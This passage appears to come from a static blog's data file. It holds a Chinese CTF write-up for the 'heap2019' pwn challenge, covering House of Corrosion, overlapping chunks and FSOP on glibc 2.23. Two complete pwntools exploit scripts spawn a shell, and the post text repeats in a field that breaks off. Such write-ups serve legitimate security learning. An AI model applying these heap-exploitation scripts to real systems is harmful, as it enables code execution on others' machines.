class=\"string\">b&quot;.txt&quot;</span>+p32(data_addr+<span class=\"number\">4</span>)+p32(str_r3_r4)</span><br><span class=\"line\">payload+=p32(pop_r0_pc)*<span class=\"number\">3</span>+p32(data_addr)+p32(print_file_addr)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"铁人三项heap2019","date":"2023-01-10T10:50:21.000Z","_content":"\n第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。\n\n<!--more-->\n\n保护全开，先逆向看下。\n\n64位菜单堆题，libc-2.23，没有show，edit也不能edit chunk，不过可以写bss段上的一点东西，可以轻易得到一个任意地址写`0xdeadbeef`；alloc 限制了 size > 0x90 && size <= 0x2333，申请不到`fast bin chunk`，不过使用的是`malloc`，没有对申请的内存进行清理；free没有问题。\n\n![img](./%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png)\n\n利用的是House of Corrosion，将0xdeadbeef调整偏移写到`global_max_fast`。`global_max_fast`是一个libc中的全局变量，表示最大的fastbin chunk的大小，默认为`0x80`，在没有初始化堆的情况下为`0`。\n\n改写`globla_max_fast`可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。`fastbinsY`中有10个元素，存放大小从`0x20~0xb0`的chunk，当超出该范围的chunk进入`fastbinsY`时，就会发生**数组越界**。利用此方法我们可以向`fastbinsY`后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。\n\n偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。\n\n一开始打算将`globla_max_fast`写为`0xdead`，通过free直接将堆地址写入`_IO_list_all`打FSOP，结果free后的chunk中只有`fd`字段有内容，其余部分的内容都被清空了。这是fast bin特有的吗？unsorted bin好像不会，之前没太注意。\n\n后面参考了下main的思路，也有了些想法。\n\n1. main的思路：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xde增大global_max_fast -> 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -> 分配到__malloc_hook附近修改__malloc_hook`。\n\n2. 同main的思路，但是打`IO`：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xde增大global_max_fast -> 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -> 分配到_IO_list_all/vtable附近伪造IO_FILE/vtable -> 走exit到_IO_OVERFLOW`（未尝试过）。\n\n3. 借鉴main的思路，利用`House of Corrosion`打`IO`：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xdead增大global_max_fast -> 利用House of Corrosion劫持_IO_list_all -> 利用overlapping伪造IO_FILE -> 走exit到_IO_OVERFLOW`。\n\n下面先按照3的思路写：\n\n## leak \n\n这题泄露地址挺简单的，输入`2019`就会返回`bss`中的`heap_list`，借此可以泄露出程序基地址。\n\nlibc和heap地址泄露也不难，程序中`malloc`时不会清理原有数据，因此可以借助`unsorted bin chunk的fd和bk`泄露libcbase和heapbase。\n\n## overlapping\n\n首先利用任意地址写`0xdeadbeef`修改`size`来构造overlapping，这波遇到了之前没有遇到的问题，也算是有些收获。\n\nptmalloc**完全依靠`chunk`的`prev_size`和`size`两个字段来判断chunk的使用情况和对chunk的前后块进行定位**，即使`prev_size`和`size`是有问题的，只要能通过检查就能正常执行。\n\n在这道题中就是如此，利用任意地址写`0xdeadbeef`可以伪造`chunk`的`size`为`0xde`，这个`size`在64位系统下是不正常的，因为64位系统下的`size`是`0x10`对齐的，正常情况下不会出现这样`size`的`chunk`，这个`size`的`chunk`也无法被申请或切割得到，但是在本次利用中，并没有针对对齐的检查，这个`size`的`chunk`是可以使用的（除了不能直接malloc）。\n\n那要如何利用任意地址写`0xdeadbeef`修改`size`来构造overlapping呢？**关键在于伪造`chunk`前后的`prev_size`和`size`**。ptmalloc定位`next chunk`的方法是`chunk + (size - flags)`，通过此式子在对应的位置写入合理的`prev_size`和`size`，保证`size==next_chunk->prev_size`和`chunk+size==next_chunk`\n\n本题中通过修改`free`后`chunk`的`size`为`0xde`实现初步的overlapping，但这是不够的。由于这个`size`的特殊性，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        不能直接申请出来，因此只能通过切割来获取能申请出来的`chunk`，而这个`chunk`最大也只有`0xb0`的大小（`last_remainder>=MIN_SIZE`才会切割），但就算这个`chunk`原来申请时申请最小的大小，`size`也要到`0xa0`（`malloc(0x98)`的情况下），最多只能控制到正常情况下下一个`chunk`的`fd`和`bk`，对于伪造`IO_FILE`是不够的（调试的时候看到即使是打`__malloc_hook`也不够）\n\n```sh\npwndbg> x/40gx 0x55bf8d2d10a0\n0x55bf8d2d10a0:\t0xadbeef00000000a0\t0x00000000000000de <- 伪造 id==1的chunk的size，原本为0xa1\n0x55bf8d2d10b0:\t0x00007fd3f3138b78\t0x00007fd3f3138b78\n0x55bf8d2d10c0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d10d0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d10e0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d10f0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1100:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1110:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1120:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1130:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1140:\t0x00000000000000a0\t0x00000000000000a0 <- id==2\n0x55bf8d2d1150:\t0x6363636363636363\t0x6363636363636363 <- 修改 size==de后可以堆叠到这里\n0x55bf8d2d1160:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d1170:\t0x6363636363636363\t0x00000000000000d8\n0x55bf8d2d1180:\t0x0000000000000061\t0x6363636363636363\n0x55bf8d2d1190:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11a0:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11b0:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11c0:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11d0:\t0x6363636363636363\t0x6363636363636363\npwndbg> x/10gx 0x55bf8bcdd040\n0x55bf8bcdd040:\t0x000055bf8d2d1010\t0x0000000000000000 <- heap_list\n0x55bf8bcdd050:\t0x000055bf8d2d1150\t0x000055bf8d2d11f0\n0x55bf8bcdd060:\t0x000055bf8d2d2600\t0x0000000000000000\n```\n\n因此，我们要借助这个初步的overlapping得到更大范围的overlapping。由于我们可以控制到正常情况下，下一个`chunk`的`fd`和`bk`，那我们自然也可以控制其`prev_size`和`size`来再次实现overlapping，并且这次构造的`prev_size`和`size`的值可以由我们自行控制，我们甚至可以构造一个完整包含下一（几）个`chunk`的`size`，不过注意要在对应地方伪造`next_chunk->prev_size`。\n\n```sh\npwndbg> x/30gx 0x563da84b90a0\n0x563da84b90a0:\t0xadbeef00000000a0\t0x00000000000000b1 <- id==1\n0x563da84b90b0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90c0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90d0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90e0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90f0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9100:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9110:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9120:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9130:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9140:\t0x0000000000000000\t0x00000000000014b1 <- 伪造 id==2的chunk的size，原本为0xa0\n0x563da84b9150:\t0x6363636363636363\t0x0000000000000029 <- 切割后chunk的位置\n0x563da84b9160:\t0x00007f50b666db78\t0x00007f50b666db78\n0x563da84b9170:\t0x6363636363636363\t0x0000000000000028\n0x563da84b9180:\t0x0000000000000061\t0x6363636363636363\n0x563da84b9190:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91a0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91b0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91c0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91d0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91e0:\t0x00000000000000a0\t0x0000000000001411  <- id==1\n0x563da84b91f0:\t0x6464646464646464\t0x6464646464646464\n0x563da84b9200:\t0x6464646464646464\t0x6464646464646464\npwndbg> x/10gx 0x563da7d62040\n0x563da7d62040:\t0x0000563da84b9010\t0x0000563da84b90b0 <- heap_list\n0x563da7d62050:\t0x0000563da84b9150\t0x0000563da84b91f0\n0x563da7d62060:\t0x0000563da84ba600\t0x0000000000000000\n```\n\n这里我选择的是构造完整包含下一个`chunk`的`size`，至此我们构造的overlapping已经足够了。\n\n## House of Corrision\n\n`House of Corrosion`是一个很早的利用，**通过改写全局变量`global_max_fast`来扩大fast bin chunk的大小范围，以此来实现对fastbinsY的数组越界利用**，可以做到越界申请内存或写入一个堆地址。\n\n偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。\n\n此处利用任意地址写`0xdead`来修改`global_max_fast`的大小，之后利用`free`将一个堆地址写到`_IO_list_all`来劫持`IO`流。被写的这个堆地址指向的`chunk`就是之前overlapping构造好的`chunk`，因此`size`需要提前计算好并设置。\n\n## FSOP\n\n劫持`_IO_list_all`后就可以伪造一个`IO_FILE`结构体，并伪造其`vtable`（glibc-2.23没有对`vtable`的合法性检查），程序里面有`exit`的功能，会调用`exit()`，因此这里选择的是走`exit() -> ... ->  _IO_flush_all_lockp() -> _IO_OVERFLOW`的链。\n\n为此伪造的IO_FILE需要满足以下条件：\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n伪造`_flags=\"/bin/sh\\x00\"`，`vtable`中的`_IO_OVERFLOW=system`，当调用`exit()`时就会一路调用到`system(\"/bin/sh\\x00\")`。\n\n伪造的`IO`如下：\n\n```py\n# construct fake io\npayload=p64(0)*3+p64(sys_addr)+'a'*0x70\nfake_io=\"/bin/sh\\x00\"+p64(0x1411)\nfake_io+=p64(0)*3+p64(1)+p64(0)\nfake_io=fake_io.ljust(0xd8,'\\x00')\nfake_io+=p64(heapbase+0x150) # vtable\npayload+=fake_io\n```\n\n## exp\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\n\ndef add(length,content):\n  ru(\"4.exit\\n\")\n  sl(\"1\")\n  ru(\"Content length:\\n\")\n  sl(str(length))\n  ru(\"Content:\")\n  s(str(content))\n\ndef delete(id):\n  ru(\"4.exit\\n\")\n  sl(\"3\")\n  ru(\"Content id:\\n\")\n  sl(str(id))\n\ndef edit(addr):\n  ru(\"4.exit\\n\")\n  sl(\"2\")\n  ru(\"Comment:\\n\")\n  s(addr)\n\ndef get_heap_addr():\n  ru(\"4.exit\\n\")\n  sl(\"2019\")\n  heap_list=ru(\"\\n\")\n  heap_list=int(heap_list[2:],16)\n  return heap_list\n\nheap_list=get_heap_addr()\nelfbase=heap_list-0x202040\n\nadd(0x98,'a'*0x98) # 0\nadd(0x98,'b'*0x98) # 1\ndelete(0)\nadd(0x98,\"aaaaaaaa\") # 0\nru(\"aaaaaaaa\")\nlibcbase=uu64(ru(\"\\x7f\"))-3951480 \n\nadd(0x98,'c'*0x98) # 2\nadd(0x98,'d'*0x98) # 3\nadd(0x98,'f'*0x98) # 4\ndelete(0)\ndelete(2)\n\nadd(0x98,'aaaaaaaa') # 0\nru(\"aaaaaaaa\")\nheapbase=uu64(ru('\\n')[:-1])-0x140\n\nglobal_max_fast=libcbase+0x3c67f8\n_IO_list_all=libcbase+libc.sym['_IO_list_all']\nfastbinsY=libcbase+libc.sym['__malloc_hook']+0x10+0x8\nchunk_size=(_IO_list_all-fastbinsY)*2+0x20-0x10\nsys_addr=libcbase+libc.sym['system']\n\n# construct fake prev_size and size to bypass unlink when add\npayload='c' * 0x28 + p64(0xd8) + p64(0x61)\nadd(0x98,payload) # 2\n\n# update the size\ndelete(4)\ndelete(3)\nadd(chunk_size,'d'*0x98) # 3\nadd(0x98,'f'*0x98) # 4\n\n# delete 1 and overwrite its size to 0xde\ndelete(1)\npayload='a'*0x20+p64(heapbase+0xa8-0x3)\nedit(payload)\n\npayload='A'*0x90+p64(0)+p64(chunk_size+0x10+0xa1)\nadd(0xa8,payload) # 1\n\n# 5 will not exist, put all free chunk to small bin to prevent unexpected error\nru(\"4.exit\\n\")\nsl(\"1\")\nru(\"Content length:\\n\")\nsl(str(0x100))\n\ndelete(2)\n\npayload='g'*0x90+p64(0)+p64(chunk_size+0x11)\n\nadd(0x14a0,payload) # 2\n\n# write global_max_fast to 0xdead\npayload='a'*0x20+p64(global_max_fast-0x2)\nedit(payload)\n\n# House of corrosion\n# hijack _IO_list_all\ndelete(3)\n\ndelete(2)\n# construct fake io\npayload=p64(0)*3+p64(sys_addr)+'a'*0x70\nfake_io=\"/bin/sh\\x00\"+p64(0x1411)\nfake_io+=p64(0)*3+p64(1)+p64(0)\nfake_io=fake_io.ljust(0xd8,'\\x00')\nfake_io+=p64(heapbase+0x150) # vtable\npayload+=fake_io\n# overwrite 3\nadd(0x14b0-0x10,payload) # 2\n\n\nleak(\"heap_list\",hex(heap_list))\nleak(\"elfbase\",hex(elfbase))\nleak(\"libcbase\",hex(libcbase))\nleak(\"heapbase\",hex(heapbase))\nleak(\"global_max_fast\",hex(global_max_fast))\nleak(\"_IO_list_all\",hex(_IO_list_all))\nleak(\"fastbinsY\",hex(fastbinsY))\nleak(\"chunk_size\",hex(chunk_size))\nleak(\"sys_addr\",hex(sys_addr))\n# debug()\n\n# trigger\nru(\"4.exit\\n\")\nsl(\"4\")\n\nitr()\n```\n\n## 其他思路\n\n如果按照main的思路走的话，一直到overlapping都是一样的，但overlapping的`chunk`的`size`有所不同，这里需要另其为`0xd0`，这样才能通过任意地址写`0xde`来伪造`size`。\n\n首先需要利用任意地址写`0xde`修改`global_max_fast`，让`0xd0`大小的`chunk`都能被认为是`fast bin chunk`，之后将overlapping的大小为`0xd0`的`chunk`释放到越界的`fast bin`中。\n\n打`__malloc_hook`的话，由于只能任意地址写`0xde`来伪造`size`，需要在`__malloc_hook`前面找一段`0x0000000000000000`的空间来伪造`size`。\n\n伪造好后利用overlapping修改`0xd0`大小的`fast bin`中`chunk`的`fd==fake_chunk`，之后申请两次即可得到`__malloc_hook`处的内存，修改其为`one_gadget`即可`get shell`。\n\nexp:\n\n```py\nfrom pwn import *\ncontext(os = 'linux',arch = 'amd64',log_level = 'debug')\n       \nmode = 1\nif mode == 1:\n    fang = process(\"./heap2019\")  \nelse:\n    fang = remote(\"node4.buuoj.cn\",28812)\n\ndef debug():\n    gdb.attach(fang)\n    pause()\n\ndef alloc2(size):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(1))\n    fang.recvuntil(\"Content length:\\n\")\n    fang.sendline(str(size))\n\ndef alloc(size,cont):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(1))\n    fang.recvuntil(\"Content length:\\n\")\n    fang.sendline(str(size))\n    fang.recvuntil(\"Content:\\n\")\n    fang.send(cont)\n\ndef dele(idx):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(3))\n    fang.recvuntil(\"Content id:\\n\")\n    fang.sendline(str(idx))\n\ndef edit(cont):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(2))\n    fang.recvuntil(\"Comment:\\n\")\n    fang.send(cont)\n\n# libc = ELF(\"./libc-2.23.so\")\nlibc = ELF(\"/home/functionmain/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so\")\n\n# gdb.attach(fang,'b *(0x555555400000 + 0xc1d)')\n# pause()\n\nfang.recvuntil(\"4.exit\\n\")\nfang.sendline(str(2019))\nfang.recvuntil(\"0x\")\nelf_base = int(fang.recv(12),16) - 0x202040\n\n\nalloc(0x98,b'a' * 0x98) # 0\n\npayload = b'a' * 0x98\nalloc(0x98,payload) # 1\n\nalloc(0x98,payload) # 2\n\npd = b'b' * 0x98\nalloc(0x98,pd) # 3\n\npd = b'A' * 0x20 + p64(0) + p64(0x71)\nalloc(0x98,pd) # 4\n\ndele(0)\nalloc(0x98,b'a') # 0\nfang.recvuntil(\"Data is:\\n\")\nlibc_base = u64(fang.recv(6).ljust(8,b'\\x00')) - 0x3c4b61\none_gadget4 = [0x45226,0x4527a,0xf03a4,0xf1247]\none_gadget_addr = libc_base + one_gadget4[3]\n\ndele(0)\ndele(2)\nalloc(0x98,b'aaaaaaaa') # 0\nfang.recvuntil(\"aaaaaaaa\")\nheap_base = u64(fang.recv(6).ljust(8,b'\\x00')) - 0x140\n\n# 是0x28且size是0xd8是因为前一个chunk的size被修改为0xde，除去标志位的size就是0xd8，而寻找下一个chunk是依靠size的大小的\n# 因此会认为chunk_addr+size，所以会找到0xd8的位置，并认为他是prev_size\n# 正常情况下size都是0x10对齐的(64bit下)，但这里不是，所以会出现这样的情况\npayload = b'b' * 0x28 + p64(0xd8) + p64(0x61)\nalloc(0x98,payload) # 2\n\ndele(1)\npayload = b'a' * 0x20 + p64(heap_base + 0xa8 - 3)\nedit(payload)\n\n# 余下的要大于MIN_SIZE才会切割，顺便改写id==2的size\npayload = b\"A\" * 0x90 + p64(0) + p64(0x141)\nalloc(0xa8,payload) # 1\n\nalloc2(0x98) # 5 马上free的，只是把unsorted剩下的赶进去small bin\n\n# 放进 unsorted bin\ndele(2)\n\npayload = b'a' * 0x90 + p64(0) + p64(0xd1)\nalloc(0x130,payload) # 2\n\ndele(2)\n\n# 修改 global_max_fast\npayload = b'a' * 0x20 + p64(libc_base + 0x3c67f8 - 3)\nedit(payload)\n\n# 进入 fastbinsY，越界写到了last_remainder\ndele(3)\n\n# 在__malloc_hook前伪造size\npayload = b'a' * 0x20 + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30 + 8 - 3)\nedit(payload)\n\n# 覆写fd指向fake chunk(__malloc_hook前)\npayload = b'a' * 0x90 + p64(0) + p64(0xd1) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30 )\nalloc(0x130,payload) # 2\n\nalloc(0xc0,'BBBB') # 3\n\ndele(0)\n\n# 分配并修改malloc\npayload = b'A' * 0x18 + p64(one_gadget_addr) + p64(libc_base + libc.symbols[\"realloc\"])\nalloc(0xc0,payload) # 0\n\n# gdb.attach(fang,'b *(0x555555400000 + 0xAC9)')\n# pause()\nalloc2(0x100)\n\nlog.info(\"elf_base : 0x%x\" % elf_base)\nlog.info(\"libc_base : 0x%x\" % libc_base)\nlog.info(\"heap_base : 0x%x\" % heap_base)\n# debug()\n\nfang.interactive()\n\"\"\"\n0x45226 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4527a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n\"\"\"\n```\n\n","source":"_posts/铁人三项heap2019.md","raw":"---\ntitle: 铁人三项heap2019\ndate: 2023-01-10 18:50:21\ntags:\n- pwn\n- heap\n- house_of_xxx\ncategories: \n- pwn_wp\n\n---\n\n第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。\n\n<!--more-->\n\n保护全开，先逆向看下。\n\n64位菜单堆题，libc-2.23，没有show，edit也不能edit chunk，不过可以写bss段上的一点东西，可以轻易得到一个任意地址写`0xdeadbeef`；alloc 限制了 size > 0x90 && size <= 0x2333，申请不到`fast bin chunk`，不过使用的是`malloc`，没有对申请的内存进行清理；free没有问题。\n\n![img](./%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png)\n\n利用的是House of Corrosion，将0xdeadbeef调整偏移写到`global_max_fast`。`global_max_fast`是一个libc中的全局变量，表示最大的fastbin chunk的大小，默认为`0x80`，在没有初始化堆的情况下为`0`。\n\n改写`globla_max_fast`可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。`fastbinsY`中有10个元素，存放大小从`0x20~0xb0`的chunk，当超出该范围的chunk进入`fastbinsY`时，就会发生**数组越界**。利用此方法我们可以向`fastbinsY`后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。\n\n偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。\n\n一开始打算将`globla_max_fast`写为`0xdead`，通过free直接将堆地址写入`_IO_list_all`打FSOP，结果free后的chunk中只有`fd`字段有内容，其余部分的内容都被清空了。这是fast bin特有的吗？unsorted bin好像不会，之前没太注意。\n\n后面参考了下main的思路，也有了些想法。\n\n1. main的思路：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xde增大global_max_fast -> 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -> 分配到__malloc_hook附近修改__malloc_hook`。\n\n2. 同main的思路，但是打`IO`：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xde增大global_max_fast -> 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -> 分配到_IO_list_all/vtable附近伪造IO_FILE/vtable -> 走exit到_IO_OVERFLOW`（未尝试过）。\n\n3. 借鉴main的思路，利用`House of Corrosion`打`IO`：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xdead增大global_max_fast -> 利用House of Corrosion劫持_IO_list_all -> 利用overlapping伪造IO_FILE -> 走exit到_IO_OVERFLOW`。\n\n下面先按照3的思路写：\n\n## leak \n\n这题泄露地址挺简单的，输入`2019`就会返回`bss`中的`heap_list`，借此可以泄露出程序基地址。\n\nlibc和heap地址泄露也不难，程序中`malloc`时不会清理原有数据，因此可以借助`unsorted bin chunk的fd和bk`泄露libcbase和heapbase。\n\n## overlapping\n\n首先利用任意地址写`0xdeadbeef`修改`size`来构造overlapping，这波遇到了之前没有遇到的问题，也算是有些收获。\n\nptmalloc**完全依靠`chunk`的`prev_size`和`size`两个字段来判断chunk的使用情况和对chunk的前后块进行定位**，即使`prev_size`和`size`是有问题的，只要能通过检查就能正常执行。\n\n在这道题中就是如此，利用任意地址写`0xdeadbeef`可以伪造`chunk`的`size`为`0xde`，这个`size`在64位系统下是不正常的，因为64位系统下的`size`是`0x10`对齐的，正常情况下不会出现这样`size`的`chunk`，这个`size`的`chunk`也无法被申请或切割得到，但是在本次利用中，并没有针对对齐的检查，这个`size`的`chunk`是可以使用的（除了不能直接malloc）。\n\n那要如何利用任意地址写`0xdeadbeef`修改`size`来构造overlapping呢？**关键在于伪造`chunk`前后的`prev_size`和`size`**。ptmalloc定位`next chunk`的方法是`chunk + (size - flags)`，通过此式子在对应的位置写入合理的`prev_size`和`size`，保证`size==next_chunk->prev_size`和`chunk+size==next_chunk`\n\n本题中通过修改`free`后`chunk`的`size`为`0xde`实现初步的overlapping，但这是不够的。由于这个`size`的特殊性，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        不能直接申请出来，因此只能通过切割来获取能申请出来的`chunk`，而这个`chunk`最大也只有`0xb0`的大小（`last_remainder>=MIN_SIZE`才会切割），但就算这个`chunk`原来申请时申请最小的大小，`size`也要到`0xa0`（`malloc(0x98)`的情况下），最多只能控制到正常情况下下一个`chunk`的`fd`和`bk`，对于伪造`IO_FILE`是不够的（调试的时候看到即使是打`__malloc_hook`也不够）\n\n```sh\npwndbg> x/40gx 0x55bf8d2d10a0\n0x55bf8d2d10a0:\t0xadbeef00000000a0\t0x00000000000000de <- 伪造 id==1的chunk的size，原本为0xa1\n0x55bf8d2d10b0:\t0x00007fd3f3138b78\t0x00007fd3f3138b78\n0x55bf8d2d10c0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d10d0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d10e0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d10f0:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1100:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1110:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1120:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1130:\t0x6262626262626262\t0x6262626262626262\n0x55bf8d2d1140:\t0x00000000000000a0\t0x00000000000000a0 <- id==2\n0x55bf8d2d1150:\t0x6363636363636363\t0x6363636363636363 <- 修改 size==de后可以堆叠到这里\n0x55bf8d2d1160:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d1170:\t0x6363636363636363\t0x00000000000000d8\n0x55bf8d2d1180:\t0x0000000000000061\t0x6363636363636363\n0x55bf8d2d1190:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11a0:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11b0:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11c0:\t0x6363636363636363\t0x6363636363636363\n0x55bf8d2d11d0:\t0x6363636363636363\t0x6363636363636363\npwndbg> x/10gx 0x55bf8bcdd040\n0x55bf8bcdd040:\t0x000055bf8d2d1010\t0x0000000000000000 <- heap_list\n0x55bf8bcdd050:\t0x000055bf8d2d1150\t0x000055bf8d2d11f0\n0x55bf8bcdd060:\t0x000055bf8d2d2600\t0x0000000000000000\n```\n\n因此，我们要借助这个初步的overlapping得到更大范围的overlapping。由于我们可以控制到正常情况下，下一个`chunk`的`fd`和`bk`，那我们自然也可以控制其`prev_size`和`size`来再次实现overlapping，并且这次构造的`prev_size`和`size`的值可以由我们自行控制，我们甚至可以构造一个完整包含下一（几）个`chunk`的`size`，不过注意要在对应地方伪造`next_chunk->prev_size`。\n\n```sh\npwndbg> x/30gx 0x563da84b90a0\n0x563da84b90a0:\t0xadbeef00000000a0\t0x00000000000000b1 <- id==1\n0x563da84b90b0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90c0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90d0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90e0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b90f0:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9100:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9110:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9120:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9130:\t0x4141414141414141\t0x4141414141414141\n0x563da84b9140:\t0x0000000000000000\t0x00000000000014b1 <- 伪造 id==2的chunk的size，原本为0xa0\n0x563da84b9150:\t0x6363636363636363\t0x0000000000000029 <- 切割后chunk的位置\n0x563da84b9160:\t0x00007f50b666db78\t0x00007f50b666db78\n0x563da84b9170:\t0x6363636363636363\t0x0000000000000028\n0x563da84b9180:\t0x0000000000000061\t0x6363636363636363\n0x563da84b9190:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91a0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91b0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91c0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91d0:\t0x6363636363636363\t0x6363636363636363\n0x563da84b91e0:\t0x00000000000000a0\t0x0000000000001411  <- id==1\n0x563da84b91f0:\t0x6464646464646464\t0x6464646464646464\n0x563da84b9200:\t0x6464646464646464\t0x6464646464646464\npwndbg> x/10gx 0x563da7d62040\n0x563da7d62040:\t0x0000563da84b9010\t0x0000563da84b90b0 <- heap_list\n0x563da7d62050:\t0x0000563da84b9150\t0x0000563da84b91f0\n0x563da7d62060:\t0x0000563da84ba600\t0x0000000000000000\n```\n\n这里我选择的是构造完整包含下一个`chunk`的`size`，至此我们构造的overlapping已经足够了。\n\n## House of Corrision\n\n`House of Corrosion`是一个很早的利用，**通过改写全局变量`global_max_fast`来扩大fast bin chunk的大小范围，以此来实现对fastbinsY的数组越界利用**，可以做到越界申请内存或写入一个堆地址。\n\n偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk 